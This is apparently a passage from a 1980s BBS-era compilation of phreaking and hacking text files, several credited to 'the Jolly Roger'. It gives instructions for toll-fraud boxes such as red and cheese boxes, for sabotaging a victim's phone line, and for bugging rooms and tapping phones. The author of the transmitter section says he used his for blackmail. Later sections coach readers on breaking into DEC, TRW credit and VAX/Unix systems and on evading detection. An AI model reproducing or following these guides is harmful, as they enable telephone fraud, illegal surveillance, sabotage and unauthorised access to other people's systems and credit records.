connected to the center pole of the potentiometer next to it.
The middle terminal of T1 is connected to the piece of wire that runs down
to the end of the battery.

Correct operation of The Pearl Box:
===================================
You may want to get some dry-transfer decals at Radio Shack to make this
job a lot easier. Also, some knobs for the tops of the potentiometers
may be useful too. Use the decals to calibrate the knobs. R1 is the knob
for the ones place, R2 is for the tens place, R3 if for the hundreds
place and R4 is for the thousands place. S1 is for producing the all the
tones and S2 is for power. 
Step 1: Turn on the power and adjust the knobs for the desired tone.
       (Example: For 2600 hz-
         R1=0:R2=0:R3=6:R4=2)
Step 2: Hit the pushbutton switch and VIOLA! You have the tone. If 
you don't have a tone recheck all connections and schematic.

Red Box Plans                                   by the Jolly Roger

Red boxing is simulating the tones produced by public payphones when you
drop your money in. The tones are beeps of 2200 Hz + 1700 Hz
Nickle = 1 beep for 66 milliseconds.
Dime = 2 beeps, each 66 milliseconds with a 66 millisecond pause between
beeps.
Quarter = 5 beeps, each 33 milliseconds with a 33 millisecond
pause between beeps.

There are two commonly used methods being used by Phreaks to make free calls.
1. An electronic hand-held device that is made from a pair of Wien-bridge
oscillators with the timing controlled by 555 timing chips.
2. A tape recording of the tones produced by a home computer. One of
the best computers to use would be an Atari ST. It is one of the easier
computers to use because the red box tones can be produced in basic with only
about 5 statments.

Scarlet Box Plans                               by the Jolly Roger

   The purpose of a Scarlet box is to create a very bad conection,
it can be used to crash a BBS or just make life miserable for those you
seek to avenge.
Materials: 2 alligator clips, 3 inch wire, or a resister
(plain wire will create greatest amount of static)
(Resister will decrease the amount of static in porportion to 
the resister you are using)

Step (1): Find the phone box at your victims house, and pop the cover off.
Step (2): Find the two prongs that the phone line you wish to box are
connected to.
Step (3): Hook your alligator clips to your (wire/resister).
Step (4): Find the lower middle prong and take off all wires connected to
it, i think this disables the ground and call waiting and shit like that.
Step (5): Now take one of the alligator clips and attach it to the upper
most prong, and take the other and attach it to the lower middle prong.
Step (6): Now put the cover back on the box and take off!!

Introduction:
------------
     First a bit of Phone Trivia. A standard telephone keypad has 12 buttons.
These buttons, when pushed, produce a combination of two tones. These tones
represent the row and column of the button you are pushing.
            1   1   1
            2   3   4
            0   3   7
            9   6   7
     697   (1) (2) (3)
     770   (4) (5) (6)
     851   (7) (8) (9)
     941   (*) (0) (#)
So (1) produces a tone of 697+1209, (2) produces a tone of 697+1336, etc.

Function:
--------
     What the Silver Box does is just creates another column of buttons,
with the new tone of 1633. These buttons are called A, B, C, and D.

Usefulness:
----------
     Anyone who knows anything about phreaking should know that in the
old days of phreaking, phreaks used hardware to have fun instead of other
people's Sprint and MCI codes. The most famous (and useful) was the good
ol' Blue Box. However, Ma Bell decided to fight back and now most phone systems
have protections against tone-emitting boxes. This makes boxing just
about futile in most areas of the United States (ie those areas with Crossbar
or Step-By-Step). If you live in or near a good-sized city, then your phone
system is probably up-to-date (ESS) and this box (and most others)
will be useless. However, if you live in the middle of nowhere (no offense
intended), you may find a use for this and other boxes.

Materials:
---------
     1  Foot of Blue Wire
     1  Foot of Grey Wire
     1  Foot of Brown Wire
     1  Small SPDT Switch (*)
     1  Standard Ma Bell Phone
(*) SPDT = Single Pole/Double Throw

Tools:
-----
     1  Soldering Iron
     1  Flat-Tip Screwdriver

Procedure:
---------
(1) Loosen the two screws on the bottom of the phone and take the casinf off.
(2) Loosen the screws on the side of the keypad and remove the keypad from
the mounting bracket.
(3) Remove the plastic cover from the keypad.
(4) Turn the keypad so that *0# is facing you. Turn the keypad over. You'll see
a bunch of wires, contacts, two Black Coils, etc.
(5) Look at the Coil on the left. It will have five (5) Solder Contacts
facing you. Solder the Grey Wire to the fourth Contact Pole from the left.
(6) Solder the other end of the Grey Wire to the Left Pole of the SPDT Switch.
(7) Find the Three (3) Gold-Plated Contacts on the bottom edge of the keypad.
On the Left Contact, gently seperate the two touching Connectors (they're
soldered together) and spread them apart.
(8) Solder the Brown Wire to the Contact farthest from you, and solder the
other end to the Right Pole of the SPDT Switch.
(9) Solder the Blue Wire to the Closest Contact, and the other end to the
Center Pole of the SPDT Switch.(10) Put the phone back together.

Using The Silver Box:
--------------------
     What you have just done was installed a switch that will change
the 369# column into an ABCD column. For example, to dial a 'B', switch
to Silver Box Tones and hit '6'.
     Noone is sure of the A, B, and C uses. However, in an area with an
old phone system, the 'D' button has an interesting effect. Dial Directory
Assistance and hold down 'D'. The phone will ring, and you
should get a pulsing tone. If you get a pissed-off operator, you have a
newer phone system with defenses against Silver Boxes.
At the pulsing tone, dial a 6 or 7. These are loop ends.

White Box Plans                                 by the Jolly Roger

Introduction:
------------
     The White Box is simply a portable Touch-Tone keypad. For more
information on Touch-Tone, see my Silver Box Plans.
Materials:
---------
  1 Touch-Tone Keypad
  1 Miniature 1000 to 8 Ohm Transformer
    (Radio Shack # 273-1380)
  1 Standard 8 Ohm Speaker
  2 9V Batteries
  2 9V Battery Clips

Procedure:
---------
(1) Connect the Red Wire from the Transformer to either terminal on the
Speaker.
(2) Connect the White Wire from the Transformer to the other terminal on
the Speaker.
(3) Connect the Red Wire from one Battery Clip to the Black Wire from the other
Battery Clip.
(4) Connect the Red Wire from the second Battery Clip to the Green Wire
from the Keypad.
(5) Connect the Blue Wire from the Keypad to the Orange/Black Wire from
the Keypad.
(6) Connect the Black Wire from the first Battery Clip to the two above
wires (Blue and Black/Orange).
(7) Connect the Black Wire from the Keypad to the Blue Wire from the
Transformer.
(8) Connect the Red/Green Wire from the Keypad to the Green Wire from the
Transformer.
(9) Make sure the Black Wire from the Transformer and the remaining wires
from the Keypad are free.
(10) Hook up the Batteries.

Optional:
--------
(1) Put it all in a case.
(2) Add a Silver Box to it.

Use:
---
Just use it like a normal keypad, except put the speaker next to the
receiver of the phone you're using.

The BLAST Box                                 Courtesy of the Jolly Roger

Ever want to really make yourself be heard? Ever talk to someone on the phone
who just doesn't shut up? Or just call the operator and pop her eardrum? Well,
up until recently it has been impossible for you to do these things. That is,
unless of course you've got a blast box. All a blast box is, is a really cheap
amplifier, (around 5 watts or so) connected in place of the microphone on your
telephone. It works best on model 500 AT&T Phones, and if constructed small
enough, can be placed inside the phone.

Construction:

Construction is not really important. Well it is, but since I'm letting you make
your own amp, I really don't have to include this.

Usage:

Once you've built your blast box, simply connect a microphone (or use the
microphone from the phone) to the input of the amplifier, and presto. There it
is. Now, believe it or not, this device actually works. (At least on crossbar.)
It seems that Illinois bell switching systems allow quite alot of current to
pass right through the switching office, and out to whoever you're calling. When
you talk in the phone, it comes out of the other phone (again it works best if
the phone that you're calling has the standard western electric earpiece)
incredibly loud. This device is especially good for PBS Subscription drives.
Have "Phun", and don't get caught!

     A Cheesebox (named for the type of box the first one was
found in) is a type of box which will, in effect, make your
telephone a Pay-Phone.....This is a simple,modernized, and easy
way of doing it....

      Inside Info:These were first used by bookies many years ago
as a way of making calls to people without being called by the
cops or having their numbers traced and/or tapped......

     How To Make A Modern Cheese Box

     Ingredients:
     ------------

     1 Call Forwarding service on the line

     1 Set of Red Box Tones

     The number to your prefix's Intercept operator (do some scanning
     for this one)

     How To:
     -------

       After you find the number to the intercept operator in
your prefix, use your call-forwarding and forward all calls to
her...this will make your phone stay off the hook(actually, now
it waits for a quarter to be dropped in)...you now have a cheese
box... In Order To Call Out On This Line:You must use your Red
Box tones and generate the quarter dropping in...then,you can
make phone calls to people...as far as I know, this is fairly
safe, and they do not check much...Although I am not sure, I
think you can even make credit-card calls from a cheesebox
phone and not get traced...

HOW TO BUILD IT
_______________


     You will need the following:

Two 10K OHM and three 1.4K OHM resistors
Two 2N3904 transistors
Two Photo Cells
Two Red LED'S (The more light produced the better)
A box that will not let light in
Red and Green Wire

Light from the #1 LED must shine directly on the photocell #1. The gold
box I made needed the top of the LED's to touch the photo cell for it to
work.

The same applies to the #2 photo cell and LED.

     :   :

      1.4K  

The 1.4K resistor is variable and if the second part of the gold box is 
skipped it will still work but when someone picks up the phone they will
hear a faint dial tone in the background and might report it to the 
Gestapo er...(AT&T). 
1.4K will give you good reception with little risk of a Gestapo agent at 
your door.

    
Now that you have built it take two green wires of the same length and
strip the ends, twist two ends together and connect them to green1 and
place a piece of tape on it with "line #1" writing on it.

Continue the process with red1 only use red wire. Repeat with red2 and 
green2 but change to line #2.





HOW TO INSTALL
______________

You will need to find two phone lines that are close together. Label one of
teh phone lines "Line #1". Cut the phone lines and take the outer coating
off it. Tere should be 4 wires. Cut the yellow and black wires off and
strip the red and green wires for both lines.

Line #1 should be in two pieces. Take the green wire of one end and connect 
it to one of the green wires on the gold box. Take the other half of line
#1 and hook the free green wire to the green wire on the phone line. Repeat
the process with red1 and the other line.

All you need to do now is to write down the phone numbers of the place you
hooked it up at and go home and call it. You should get a dial tone!!!
If not, try changing the emittor with the collector.


Have a great time with this!            --------RFLAGG----------The Lunch Box                          Courtesy of Exodus

Introduction
===========

The Lunch Box is a VERY simple transmitter which can be handy for all sorts of
things. It is quite small and can easily be put in a number of places. I have
successfully used it for tapping fones, getting inside info, blackmail and
other such things. The possibilities are endless. I will also include the plans
or an equally small receiver for your newly made toy. Use it for just about
anything. You can also make the transmitter and receiver together in one box
and use it as a walkie talkie.

Materials you will need
======================

(1) 9 volt battery with battery clip
(1) 25-mfd, 15 volt electrolytic capacitor
(2) .0047 mfd capacitors
(1) .022 mfd capacitor
(1) 51 pf capacitor
(1) 365 pf variable capacitor
(1) Transistor antenna coil
(1) 2N366 transistor
(1) 2N464 transistor
(1) 100k resistor
(1) 5.6k resistor
(1) 10k resistor
(1) 2meg potentiometer with SPST switch
 Some good wire, solder, soldering iron, board to put it on, box (optional)

Notes about the schematic
=========================

1.  GND means ground
2.  The GND near the switch and the GND by the 2meg potentiometer should be
    connected.
3.  Where you see:  )(
                    ()
                    )( it is the transistor antenna coil with 15 turns of
                       regular hook-up wire around it.
4.  The middle of the loop on the left side (the left of "()") you should run
    a wire down to the "+" which has nothing attached to it. There is a .0047
    capacitor on the correct piece of wire.
5.  For the microphone use a magnetic earphone (1k to 2k).
6.  Where you see "[!]" is the antenna. Use about 8 feet of wire to broadcast
    approx 300ft. Part 15 of the FCC rules and regulation says you can't
    broadcast over 300 feet without a license. (Hahaha). Use more wire for an
    antenna for longer distances. (Attach it to the black wire on the fone
    line for about a 250 foot antenna!)

Operation of the Lunch Box
==========================

This transmitter will send the signals over the AM radio band. You use the
variable capacitor to adjust what freq. you want to use. Find a good unused
freq. down at the lower end of the scale and you're set. Use the 2 meg pot. to
adjust gain. Just fuck with it until you get what sounds good. The switch on
the 2meg is for turning the Lunch Box on and off. When everything is adjusted,
turn on an AM radio adjust it to where you think the signal is. Have a friend
lay some shit thru the Box and tune in to it. That's all there is to it. The
plans for a simple receiver are shown below:

The Lunch Box receiver

Closing statement
=================

This two devices can be built for under a total of $10.00. Not too bad. Using
these devices in illegal ways is your option. If you get caught, I accept NO
responsibility for your actions. This can be a lot of fun if used correctly.
Hook it up to the red wire on the phone line and it will send the
conversation over the air waves.

Enjoy!
 


Olive Box Plans                        Courtesy of Exodus

    This is a relatively new box, and all it basically does is serve as a phone
ringer. You have two choices for ringers, a piezoelectric transducer (ringer),
or a standard 8 ohm speaker. The speaker has a more pleasant tone to it, but
either will do fine. This circuit can also be used in conjunction with a rust
box to control an external something or other when the phone rings. Just connect
the 8 ohm speaker output to the inputs on the rust box, and control the pot to
tune it to light the light (which can be replaced by a relay for external
controlling) when the phone rings.

Description:  Briefly, the Infinity Transmitter is a device which activates a
microphone via a phone call.  It is plugged into the phone line, and when the
phone rings, it  will immediately intercept the ring and broadcast into the
phone any sound that is in the room. This device was originally made by
Information Unlimited, and had a touch tone decoder to prevent all who did not
know the code from being able to use the phone in its normal way.  This
version, however, will activate the microphone for anyone who calls while it is
in operation.
NOTE:  It is illegal to use this device to try to bug someone. It is also
pretty stupid because they are fairly noticeable.

Circuit Operation: Not being the most technical guy in the world, and not being
very good at electronics (yet),  I'm just repeating what Mr. Iannini's said
about the circuit operation.  The Transmitter consists of a high grain
amplifier fed into the telephone lines via transformer.  The circuit is
initiated by the action  of  a voltage transient pulse occurring across  the
phone line  at the instant the telephone circuit is made (the ring,  in other
words).  This transient immediately triggers a timer  whose output  pin  3 goes
positive, turning on transistors Q2 and  Q3. Timer TM1 now remains in this
state for a period depending on the values  of R17 and C13 (usually about 10
seconds for  the  values shown). When Q3 is turned on by the timer, a simulated
"off hook" condition is created by the switching action of Q3 connecting the
500  ohm  winding  of the transformer directly across  the  phone lines.
Simultaneously, Q2 clamps the ground of A1, amplifier, and Q1, output
transistor, to the negative return of B1,B2, therefore enabling this amplifier
section.  Note that B2 is always required by  supplying  quiescent power to TM1
during  normal conditions. System is off/on controlled by S1 (switch).
  A  crystal mike picks up the sounds that are fed to  the  first two
transistors of the A1 array connected as an emitter follower driving the
remaining  two  transistors  as  cascaded   common emitters. Output of the
array now drives Q1 capacitively coupled to  the  1500 ohm  winding of  T1.
R7  controls  the  pick  up sensitivity of the system.
  Diode  D1  is  forward biased at the instant of  connection  and essentially
applies a negative pulse at pin 2 of TM1,  initiating the cycle.   D2 clamps
any high positive pulses.   C9 dc-isolates and desensitizes the circuit. The
system described should operate when any incoming call is made without ringing
the phone.

Schematic Diagram:  Because this is text,  this doesn't look  too hot. Please
use  a little imagination!  I will hopefully get  a graphics drawing  of  this
out as soon as I  can  on  a  Fontrix graffile.

To be able to see what everything is, this character: | should appear as a
horizontal bar. I did this on a ][e using a ][e 80 column card, so I'm sorry if
it looks kinda weird to you.

                    sense output

Construction notes: Because the damned book just gave a picture instead of step
by step instructions, and I'll try to give you as much help as possible. Note
that all the parts that you will be using are clearly labeled in the schematic.
The perfboard, knobs, 'gator clips, etc are optional. I do strongly suggest
that you do use the board!!! It will make wiring the components up much much
easier than if you don't use it.
 The knob you can use to control the pot (R7). R7 is used to tune the IT so
that is sounds ok over the phone. (You get to determine what sounds good) By
changing the value of C13, you can change the amount of time that the circuit
will stay open (it cannot detect a hang up, so it works on a timer.) A value of
100 micro Farads will increase the time by about 10 times.
 The switch (S1) determines whether or not the unit is operational. Closed is
on. Open is off. The negative return is the negative terminals of the battery!!
The batteries will look something like this when hooked up:

  <-v_____.   .______.    ._____.   .____->
          |   |      |    |     |   |
        __!___!__    |    |   __!___!__
        | +   - |    !_/ _!   | +   - |
        |       |  switch ^   |       |
        | 9volts|         |   | 9volts|
        !_______! neg return  !_______!

 To hook this up to the phone line, there are three ways, depending upon what
type of jack you have. If it is the old type (non modular) then you can just
open up the wall plate and connect the wires from the transmitter directly to
the terminals of the phone.
 If you have a modular jack with four prongs, attach the red to the negative
prong (don't ask me which is which! I don't have that type of jack... I've only
seen them in stores), and the green to the positive prong, and plug in. Try not
to shock yourself...
 If you have the clip-in type jack, get double male extension cord (one with a
clip on each end), and chop off one clip. Get a sharp knife and splice off the
grey protective material. You should see four wires, including one green and
one red. You attach the appropriate wires from the IT to these two, and plug
the other end into the wall.

Getting the IT to work: If you happen to have a problem, you should attempt to
do the following (these are common sense rules!!) Make sure that you have the
polarity of all the capacitors right (if you used polarized capacitors, that
is). Make sure that all the soldering is done well and has not short circuited
something accidently (like if you have a glob touching two wires which should
not be touching.) Check for other short circuits. Check to see if the battery
is in right. Check to make sure the switch is closed.
 If it still doesn't work, drop me a line on one of the Maryland or Virginia
BBSs and I'll try to help you out.

The sense output: Somehow or other, it is possible to hook something else up to
this and activate it by phone (like an alarm, flashing lights, etc.)

As of this writing, I have not tried to make one of these, but I will. If you
actually get it working, leave me a note somewhere.

I sure hope all you people appreciate this.

                     \/\The Conscience of a Hacker/\/
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Another one got caught today, it's all over the papers.  "Teenager
Arrested in Computer Crime Scandal", "Hacker Arrested after Bank
Tampering"... Damn kids.  They're all alike. But did you, in your three-
piece psychology and 1950's technobrain, ever take a look behind the
eyes of the hacker?  Did you ever wonder what made him tick, what forces
shaped him, what may have molded him? I am a hacker, enter my world...
Mine is a world that begins with school... I'm smarter than most of the
other kids, this crap they teach us bores me...  Damn underachiever.
They're all alike. I'm in junior high or high school.  I've listened to
teachers explain for the fifteenth time how to reduce a fraction.
I understand it.  "No, Ms. Smith, I didn't show my work.  I did it in
my head..." Damn kid.  Probably copied it.  They're all alike.
I made a discovery today.  I found a computer.  Wait a second, this is
cool.  It does what I want it to.  If it makes a mistake, it's because I
screwed it up.  Not because it doesn't like me...  Or feels threatened by
me.. Or thinks I'm a smart ass.. Or doesn't like teaching and shouldn't be
here... Damn kid.  All he does is play games.  They're all alike. And then
it happened... a door opened to a world... rushing through the phone line
like heroin through an addict's veins, an electronic pulse is sent out,
a refuge from the day-to-day incompetencies is sought... a board is found.
"This is it... this is where I belong..." I know everyone here... even
if I've never met them, never talked to them, may never hear from them
again... I know you all... Damn kid.  Tying up the phone line again.
They're all alike... You bet your ass we're all alike... we've been
spoon-fed baby food at school when we hungered for steak... the bits of
meat that you did let slip through were pre-chewed and tasteless. 
We've been dominated by sadists, or ignored by the apathetic.  The few
that had something to teach found us willing pupils, but those few are
like drops of water in the desert.
   This is our world now... the world of the electron and the switch, the
beauty of the baud.  We make use of a service already existing without
paying for what could be dirt-cheap if it wasn't run by profiteering
gluttons, and you call us criminals.  We explore... and you call us
criminals.  We seek after knowledge... and you call us criminals.  We
exist without skin color, without nationality, without religious bias...
and you call us criminals. You build atomic bombs, you wage wars, you
murder, cheat, and lie to us and try to make us believe it's for our
own good, yet we're the criminals.
   Yes, I am a criminal.  My crime is that of curiosity.  My crime is
that of judging people by what they say and think, not what they look like.
My crime is that of outsmarting you, something that you will never
forgive me for. I am a hacker, and this is my manifesto.  You may stop
this individual,but you can't stop us all... after all, we're all alike.

What is hacking?
----------------
According to popular belief the term hacker and hacking was founded at mit
it comes from the root of a hack writer,someone who keeps "hacking" at
the typewriter until he finishes the story.a computer hacker would be
hacking at the keyboard or password works.

What you need:
--------------
To hack you need a computer equipped with a modem (a device that lets you
transmit data over phone lines) which should cost you from $100 to $1200.

How do you hack?
----------------
Hacking recuires two things:
1. The phone number
2. Answer to identity elements

How do you find the phone #?
----------------------------
There are three basic ways to find a computers phone number.
1. Scanning,
2. Directory
3. Inside info.

What is scanning?
-----------------
Scanning is the process of having a computer search for a carrier tone.
For example,the computer would start at (800) 111-1111 and wait for carrier
if there is none it will go on to 111-1112 etc.if there is a carrier it
will record it for future use and continue looking for more.

What is directory assictance?
-----------------------------
This way can only be used if you know where your target computer is. For this
example say it is in menlo park, CA and the company name is sri.

1. Dial 411 (or 415-555-1212)
2. Say "Menlo park"
3. Say "Sri"
4. Write down number
5. Ask if there are any more numbers
6. If so write them down.
7. Hang up on operator
8. Dial all numbers you were given
9. Listen fir carrier tone
10. If you hear carrier tone write down number, call it on your modem and your
    set to hack!
                            ---------------RFLAGGThe Basics of Hacking II               Courtesy of the Jolly Roger

Basics to know before doing anything, essential to your continuing
career as one of the elite in the country...  This article, "the
introduction to the world of hacking" is meant to help you by telling you
how not to get caught, what not to do on a computer system, what type of
equipment should I know about now, and just a little on the history, past
present future, of the hacker.

Welcome to the world of hacking! We, the people who live outside of the
normal rules, and have been scorned and even arrested by those from the
'civilized world', are becomming scarcer every day.  This is due to the
greater fear of what a good hacker (skill wise, no moral judgements
here)|can do nowadays, thus causing anti- hacker sentiment in the masses.
Also, few hackers seem to actually know about the computer systems they
hack, or what equipment they will run into on the front end, or what they
could do wrong on a system to alert the 'higher' authorities who monitor
the system. This article is intended to tell you about some things not to
do, even before you get on the system.  I will tell you about the new wave
of front end security devices that are beginning to be used on computers.
I will attempt to instill in you a second identity, to be brought up at
time of great need, to pull you out of trouble. And, by the way, I take no, repeat,
no, responcibility for what we say in this and the forthcoming articles.
Enough of the bullshit, on to the fun: after logging on your favorite bbs,
you see on the high access board a phone number!  It says it's a great
system to "fuck around with!" This may be true, but how many other people
are going to call the same number?  So:  try to avoid calling a number
given to the public. This is because there are at least every other
user calling, and how many other boards will that number spread to?
If you call a number far, far away, and you plan on going thru an
extender or a re-seller, don't keep calling the same access number
(I.E. As you would if you had a hacker running), this looks very suspicious
and can make life miserable when the phone bill comes in the mail.
Most cities have a variety of access numbers and services,
so use as many as you can. Never trust a change in the system...
The 414's, the assholes, were caught for this reason: when one of them
connected to the system, there was nothing good there.  The next time,
there was a trek game stuck right in their way!  They proceded to play said
game for two, say two and a half hours, while telenet was tracing them!
Nice job, don't you think?  If anything looks suspicious, drop the line
immediately!!  As in, yesterday!! The point we're trying to get accross is:
if you use a little common sence, you won't get busted.  Let the little
kids who aren't smart enough to recognize a trap get busted, it will take
the heat off of the real hackers. Now, let's say you get on a computer
system...  It looks great, checks out, everything seems fine.
Ok, now is when it gets more dangerous.  You have to know the computer
system to know what not to do. 
Basically, keep away from any command something, copy a new file into the
account, or whatever!  Always leave the account in the same status you
logged in with.  Change *nothing*... If it isn't an account with priv's,
then don't try any commands that require them! All, yes all, systems are
going to be keeping log files of what users are doing, and that will
show up.  It is just like dropping a trouble-card in an ESS system,
after sending that nice operator a pretty tone.
Spend no excessive amounts of time on the account in one stretch.
Keep your calling to the very late night ifpossible, or during
business hours (believe it or not!).  It so happens
that there are more users on during business hours, and it is very
difficult to read a log file with 60 users doing many commnds every minute.
Try to avoid systems where everyone knows each other, don't try to bluff.
And above all:  never act like you own the system, or are the best there
is. They always grab the people who's heads swell... There is some very
interesting front end equipment around nowadays, but first let's
define terms... By front end, we mean any device that you must
pass thru to get at the real computer. There are devices that are made to
defeat hacker programs, and just plain old multiplexers.
To defeat hacker programs, there are now devices that pick up the phone
and just sit there...  This means that your device gets no carrier,
thus you think there isn't a computer on the other end.  The
only way around it is to detect when it was picked up.  If it pickes up
after the same number ring, then you know it is a hacker-defeater.
These devices take a multi-digit code to let you into the system.
Some are, in fact, quite sophisticated to the point where it
will also limit the user name's down, so only one name or set of names
can be valid logins after they input the code... Other devices input a
number code, and then they dial back a pre-programmed number for that code.
These systems are best to leave alone,
because they know someone is playing with their phone.  You may think "but
i'll just reprogram the dial-back." Think again, how stupid that is...
Then they have your number, or a test loop if you were just a little
smarter. If it's your number, they have your balls (if male...),
If its a loop, then you are screwed again, since those loops
are *monitored*. As for multiplexers...  What a plexer is supposed
to do is this:
The system can accept multiple users. We have to time share, so we'll let
the front-end processor do it...  Well, this is what a multiplexer does.
Usually they will ask for something like "enter class" or "line:".  Usually
it is programmed for a double digit number, or a four to five letter word.
There are usually a few sets of numbers it accepts, but those numbers also
set your 300/1200/2400 baud data type.
These multiplexers are inconvenient at best, so not to worry. A little
about the history of hacking: hacking, by my definition, means a great
knowledge of some special area. Doctors and lawyers
are hackers of a sort, by this definition.  But most often, it is
being used in the computer context, and thus we have a definition of
"anyone who has a great amount of computer or telecommunications
knowledge."  You are not a hacker because you have a list of codes...
Hacking, by my definition, has then been around only about 15 years.
It started, where else but, mit and colleges where they had computer
science or electrical engineering departments.
Hackers have created some of the best computer languages, the
most awesome operating systems, and even gone on to make millions.
Hacking used to have a good name, when we could honestly say
"we know what we are doing".  Now it means (in the public eye):
the 414's, ron austin, the nasa hackers, the arpanet hackers...
All the people who have been caught,
have done damage, and are now going to have to face fines and sentences.
Thus we come past the moralistic crap, and to our purpose:  educate the
hacker community, return to the days when people actually knew something...

Hacking DEC's                                 by the Jolly Roger

In this article you will learn how to log in to dec's, logging out, and all
the fun stuff to do in-between.  All of this information is based on a
standard dec system.
Since there are dec systems 10 and 20, and I favor, the dec 20,
there will be more info on them in this article.  It just so happens
that the dec 20 is also the more common of the two, and is used by much
more interesting people (if you know what I mean...) Ok, the first thing
you want to do when you are receiving carrier from a dec system is to find
out the format of login names.  You can do this by looking at who is on the
system.
Dec=> `  (the 'exec' level prompt)
you=> sy
sy is short for sy(stat) and shows you the system status.
You should see the format of login names...
A systat usually comes up in this form:
job  line  program  user
job:  the job number (not important unless you want to log them off later)
line:  what line they are on (used to talk to them...)
These are both two or three digit numbers.
Program:  what program are they running under?  If it says 'exec'
they aren't doing anything at all...
User:  ahhhahhhh!  This is the user name they are logged in under...
Copy the format, and hack yourself outa working code... Login format is as
such:
dec=> `
you=> login username password
username is the username in the format you saw above in the systat.
After you hit the space after your username, it will stop echoing
characters back to your screen.  This is the password you are typing in...
Remember, people  usually use their name, their dog's name, the name of a
favorite character in a book, or something like this. A few clever
people have it set to a key cluster (qwerty or asdfg).  Pw's can be from 1
to 8 characters long, anything after that is ignored. You are finally in...
It would be nice to have a little help, wouldn't it?  Just type a ? Or the
word help, and it will give you a whole list of topics...
Some handy characters for you to know would be the control keys,
wouldn't it? Backspace on a dec 20 is rub which is 255 on your ascii chart.
On the dec 10 it is cntrl-h. To abort a long listing or a program,
cntrl-c works fine.  Use cntrl-o to stop long output to the terminal.
This is handy when playing a game, but you don't want to cntrl-c out.
Cntrl-t for the time. Cntrl-u will kill the whole line you are typing at
the moment.  You may accidently run a program where the only way out is
a cntrl-x, so keep that in reserve. Cntrl-s to stop listing, cntrl-q to
continue on both systems. Is your terminal having trouble??
Like, it pauses for no reason, or it doesn't backspace right?  This is
because both systems support many terminals, and you haven't told it what
yours is yet... You are using a vt05
so you need to tell it you are one.
Dec=> `
you=> information terminal
or...
You=> info
this shows you what your terminal is set up as...
Dec=>all sorts of shit, then the `
you=> set ter vt05 this sets your terminal
type to vt05.
Now let's see what is in the account (here after abbreviated acct.)
that you have hacked onto... Say
=> dir
short for directory, it shows
you what the user of the code has save to the disk.  There should be a format
like this:    xxxxx.Oooxxxxx is the file name, from 1 to 20 characters
long.  Ooo is the file type, one of: exe, txt, dat, bas, cmd   and a few
others that are system dependant.
Exe is a compiled program that can be run (just by typing its name at the `).
Txt is a text file, which you can see by
typing=>
type xxxxx.Txt
Do not try to=>
type xxxxx.Exe this is very bad for your terminal and will tell you
absolutly nothing.
Dat is data they have saved.
Bas is a basic program, you can have it typed out for you.
Cmd is a command type file, a little too
complicated to go into here.
Try =>
take xxxxx.Cmd
By the way, there are other users out there who may have files you can use
(gee, why else am I here?).
Type => dir <*.*> (Dec 20)
     => dir [*,*]   (dec 10)
* is a wildcard, and will allow you to access the files on other accounts
if the user has it set for public access. If it isn't set for public access,
then you won't see it. To run that program:
dec=> `
you=> username program-name
username is the directory you saw the
file listed under, and file name was
what else but the file name?
**  You are not alone  **
remember, you said (at the very start) sy  short for systat,
and how we said this showed the other users on the system?  Well, you
can talk to them, or at least send a message to anyone you see listed in a
systat.  You can do this by:
dec=> the user list (from your systat)
you=> talkusername (dec 20)
      send username (dec 10)
talk allows you and them immediate transmission of whatever you/they type
to be sent to the other.  Send only allow you one message to be sent, and
send, they will send back to you, with talk you can just keep going. By the
way, you may be noticing with the talk command that what you type is still
acted upon by the parser (control program).  To avoid the constant error
messages type either:
you=>  ;your message
you=>  rem your message
the semi-colon tells the parser that what follows is just a comment.  Rem
is short for 'remark' and ignores you from then on until you type a cntrl-z
or cntrl-c, at which point it puts you back in the exec mode. To break the
connection from a talk command type:
you=>  break priv's:
if you happen to have privs, you can do all sorts of things. 
First of all, you have to activate those privs.
You=> enable
this gives you a $ prompt, and allows you to do this:
whatever you can do to your own directory you can now do to any
other directory. To create a new acct. Using your privs, just type
=>build username
if username is old, you can edit it, if it is new, you can
define it to be whatever you wish. Privacy means nothing to a user with
privs.  By the way, there are various levels of privs:  operator, wheel,
cia.
wheel is the most powerful, being that he can log in from anywhere and
have his powers.
Operators have their power because they are at a special terminal
allowing them the privs.  Cia is short for 'confidential information
access', which allows you a low level amount of privs. 
Not to worry though, since you can read the system log file, which also
has the passwords to all the other accounts.
To de-activate your privs, type
you=> disable
when you have played your greedy heart out, you can finally leave the
system with the command=>
logout
this logs the job you are using off the system (there may be varients
of this such as kjob, or killjob).

Hacking TRW                                      by the Jolly Roger

    When you call TRW, the dial up will identify itself with the message "TRW".
It will then wait for you to type the appropiate answer back (such as CTRL-G)
 Once This has been done, the system will say "CIRCUIT BUILDING IN PROGRESS"
Along with a few numbers. After this, it clears the screen
(CTRL  L) followed by a CTRL-Q. After the system sends the CTRL-Q, It is
ready for the request. You first type the 4 character identifyer for the
geographical area of the account..

(For Example) TCA1 - for certain Calif. & Vicinity subscribers. 
TCA2 - A second CALF. TRW System. 
TNJ1 - Their NJ Database. 
TGA1 - Their Georgia Database.

The user then types A <CR> and then on the next line, he must type
his 3 char. Option. Most Requests use the RTS option.
OPX, RTX, and a few others exist. (NOTE) TRW will accept an A, C,
or S as the 'X' in the options above.) Then finally, the user types his 7
digit subscriber code. He appends his 3-4 character password after it.  It
seems that if you manage to get hold of a TRW Printout (Trashing at Sears,
Saks, ETC. or from getting your credit printout from them) Their subscriber
code will be on it leaving only a 3-4 character p/w up to you.

For Example,
(Call the DialUp)
TRW  System Types, ST) CTRL-G 
(You type,YT) Circuit building in progress 1234 
(ST) CTRL-L CRTL-Q (TCA1 CYT) BTS 3000000AAA
<CR><CRTL-S> (YT]
Note: This sytem is in Half Duplex, Even Parity, 7 Bits per word and
2 Stop Bits.

CAUTION: It is a very stressed rumor that after typing in the TRW
password Three (3) times.. It sets an Automatic Number Identification on your
ass, so be careful. And  forget who told you how to do this..

Hacking Vax's & Unix                             by the Jolly Roger

    Unix is a trademark of At&t (and you know what that means)

_______________________________________
In this article, we discuss the unix system that runs on
the various vax systems.  If you are on another unix-type system, some
commands may differ, but since it is licenced to bell, they can't make many
changes.
_______________________________________
Hacking onto a unix system is very difficult, and in this case, we advise
having an inside source, if possible. The reason it is difficult to hack a
vax is this:  Many vax, after you get a carrier from them, respond=>
Login:
They give you no chance to see what the login name format is.  Most commonly
used are single words, under 8 digits, usually the person's name.  There is
a way around this:  Most vax have an acct. called 'suggest' for people to
use to make a suggestion to the system root terminal.  This is usually watched
by the system operator, but at late he is probably at home sleeping or
